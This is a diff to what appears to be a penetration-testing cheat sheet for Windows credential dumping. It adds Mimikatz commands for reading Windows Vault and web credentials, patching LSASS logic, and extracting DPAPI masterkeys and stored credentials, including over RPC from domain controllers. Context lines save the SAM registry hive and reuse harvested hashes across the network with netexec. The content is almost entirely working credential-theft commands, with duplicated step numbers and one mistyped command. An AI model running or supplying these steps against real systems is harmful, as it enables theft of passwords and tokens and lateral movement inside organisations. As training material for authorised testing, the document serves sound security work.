@@ -38,9 +38,39 @@ Download executable
 
         lsadump::lsa
 
-7) Collect cleartext/ntlm credentials and test them on different machines in the network using different protocols like smb, winrm and rdp for example using netexec
+7) Windows Vault stored credentials (passwords and auth tokens)
 
-8) SAM Registry Keys
+        vault:cred 
+
+8) Web Credentials
+
+        vault::list 
+
+9) Altering LSASS Logic (Prevent LSASS from checking the credential type so we can dump netowrk share credentials, RDP passwords, etc)
+
+        sekurlsa::patch
+
+10) Extract Credentials with DPAPI
+
+        dpapi::cred /in:"%appdata%\Microsoft\Credentials\235BN34JIK5B34IJB345KJN"
+
+Extract the masterkey
+
+        dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-2532523532532-4234645645-35435634634-1104\cc6ehbf-2871-4afb-adf2-223gferf23"
+
+Using RPC for domain controllers
+
+        dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-2532523532532-4234645645-35435634634-1104\cc6ehbf-2871-4afb-adf2-223gferf23" /rpc
+
+
+Final decryption
+
+        dpapi::cred /in:"%appdata%\Microsoft\Credentials\235BN34JIK5B34IJB345KJN"
+
+
+9) Collect cleartext/ntlm credentials and test them on different machines in the network using different protocols like smb, winrm and rdp for example using netexec
+
+10) SAM Registry Keys
 
         reg.exe save hklm\sam C:\sam.save
 
